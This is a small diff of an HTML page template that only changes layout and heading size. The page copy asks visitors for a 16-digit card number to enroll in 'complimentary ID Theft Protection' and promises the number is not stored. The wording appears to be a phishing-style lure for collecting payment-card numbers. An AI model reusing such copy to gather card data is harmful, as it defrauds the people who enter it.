@@ -19,8 +19,8 @@
 
 <div class="bg-cover-custom">
     <div class="backdrop-blur flex items-center justify-center min-h-screen">
-        <div class="bg-white p-8  shadow-md max-w-sm w-full relative z-10">
-            <h1 class="text-2xl font-bold mb-4">Enroll in your complimentary ID Theft Protection</h1>
+        <div class="bg-white p-8 shadow-md max-w-md w-full relative z-10">
+            <h1 class="text-4xl font-bold mb-4">Enroll in your complimentary ID Theft Protection</h1>
             <p class="text-gray-700 mb-4">
                 Please enter your 16-digit card number to confirm your eligibility.
                 <span class="font-semibold">We do not store your card number, and you will not be charged for this service.</span>
